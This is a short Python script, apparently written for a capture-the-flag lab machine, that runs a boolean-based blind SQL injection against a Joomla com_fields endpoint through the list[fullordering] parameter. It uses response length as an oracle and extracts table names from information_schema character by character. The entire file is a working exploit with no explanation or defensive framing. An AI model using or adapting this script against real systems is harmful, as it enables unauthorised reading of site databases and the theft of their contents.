#!/usr/bin/env python3
import requests
import string
import urllib
import sys

def getConcat(st):
    output = "CONCAT("
    for ch in st:
        output += f"CHAR({ord(ch)}),"
    output = output[:-1] + ")"
    return output




def test(st):
    orig = "http://10.10.215.138/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE%20WHEN%20(TEST)%20THEN%201573%20ELSE%201573*(SELECT%201573%20FROM%20DUAL%20UNION%20SELECT%209674%20FROM%20DUAL)%20END)"
    r = requests.get(orig.replace("TEST", st))
    l = len(r.text)
    if l > 3530:
        return True
    else:
        return False


print("should be true: ", test("""char(41)=char(41)"""))
print("should be false: ", test("""char(42)=char(41)"""))




for w in range(0,175): # word[w]
    word = f"{w}: " 
    found = True
    print()
    for i, ch in enumerate(sys.argv[1]):
        i += 1
        tst = f"SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {w},1),{i},1)=char({ord(ch)})" 
        print(f"{tst} : {word}    - {ch}" ,end="\r")
        if test(tst):
            word += ch
        else:
            break

print("\n\ndone")


